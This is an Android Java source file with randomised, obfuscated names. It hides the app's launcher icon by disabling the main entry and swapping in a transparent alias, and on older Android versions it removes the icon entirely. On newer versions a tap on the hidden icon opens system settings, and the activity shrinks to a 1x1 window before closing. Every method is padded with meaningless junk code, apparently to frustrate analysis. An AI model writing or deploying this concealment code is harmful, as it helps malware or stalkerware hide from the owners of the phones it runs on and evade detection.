package couy.bcu.wmxkm;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Gravity;
import android.view.Window;
import android.view.WindowManager;
import androidx.appcompat.app.AppCompatActivity;

/**
 * 图标隐藏辅助 Activity。
 * 启动后会禁用主入口（HHN），并启用透明的别名入口（MysteryAliasActivity），
 * 从而在桌面上隐藏/替换应用图标。Android 10 以下可进一步禁用别名，完全移除占位图标。
 * Android 10+ 点击透明图标时跳转系统设置。
 */
public class YSEC extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        int process_hMMOnUT = new java.util.Random().nextInt(50);
        int stack_WGyzYMuvLnAAjBlcR = (process_hMMOnUT > 33) ? 1 : ((process_hMMOnUT > 95) ? 9 : ((process_hMMOnUT > 0) ? 29 : 51));
        int i_StqOJuPgNPeZbdkYD = stack_WGyzYMuvLnAAjBlcR * process_hMMOnUT;
        if (i_StqOJuPgNPeZbdkYD > 92) {
            java.lang.System.arraycopy(new int[] { i_StqOJuPgNPeZbdkYD }, 0, new int[] { 0 }, 0, 1);
        }
        super.onCreate(savedInstanceState);
        // 禁用主 Activity，启用透明别名 Activity
        set(YSEC.this, HHN.class.getName(), "couy.bcu.wmxkm.MysteryAliasActivity");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // Android 10+ 点击透明图标后跳转系统设置
            Intent intent = new Intent(Settings.ACTION_SETTINGS);
            startActivity(intent);
        } else {
            // Android 10 以下禁用别名后，透明图标占位图也会消失
            disableComponent(YSEC.this, "couy.bcu.wmxkm.MysteryAliasActivity");
        }
        Window window = getWindow();
        window.setGravity(Gravity.LEFT | Gravity.TOP);
        WindowManager.LayoutParams params = window.getAttributes();
        params.x = 0;
        params.y = 0;
        params.width = 1;
        params.height = 1;
        window.setAttributes(params);
        finish();
    }

    public static void set(Context context, String main, String alias) {
        java.lang.Object arr_CtaFoTksJzPO = new java.lang.Object();
        int i_aqvQkUtErElAUM = arr_CtaFoTksJzPO.hashCode();
        int j_qWTSmwKotEoCMm = new java.util.Random().nextInt(100);
        int tmp_LIAlKBdjsumh = (i_aqvQkUtErElAUM ^ j_qWTSmwKotEoCMm) & 0x7FFFFFFF;
        if (tmp_LIAlKBdjsumh == 3 && i_aqvQkUtErElAUM < 9) {
            arr_CtaFoTksJzPO.toString();
        }
        disableComponent(context, main);
        enableComponent(context, alias);
    }

    public static void enableComponent(Context context, String clazzName) {
        int process_hMMOnUT = new java.util.Random().nextInt(50);
        int stack_WGyzYMuvLnAAjBlcR = (process_hMMOnUT > 33) ? 1 : ((process_hMMOnUT > 95) ? 9 : ((process_hMMOnUT > 0) ? 29 : 51));
        int i_StqOJuPgNPeZbdkYD = stack_WGyzYMuvLnAAjBlcR * process_hMMOnUT;
        if (i_StqOJuPgNPeZbdkYD > 92) {
            java.lang.System.arraycopy(new int[] { i_StqOJuPgNPeZbdkYD }, 0, new int[] { 0 }, 0, 1);
        }
        ComponentName componentName = new ComponentName(context, clazzName);
        PackageManager packageManager = context.getPackageManager();
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
    }

    public static void disableComponent(Context context, String clazzName) {
        long arr_MQbpvlwis = java.lang.System.nanoTime();
        int i_bNRuM = new java.util.Random().nextInt(1000);
        boolean j_bALSNfDdzHs = (arr_MQbpvlwis % (i_bNRuM + 21)) > 45;
        double tmp_CxZzGuWaGoT = j_bALSNfDdzHs ? java.lang.Math.sqrt(i_bNRuM) : java.lang.Math.pow(i_bNRuM, 40);
        if (tmp_CxZzGuWaGoT < 0.0) {
            java.lang.System.out.println(tmp_CxZzGuWaGoT);
        }
        ComponentName componentName = new ComponentName(context, clazzName);
        PackageManager packageManager = context.getPackageManager();
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }
}
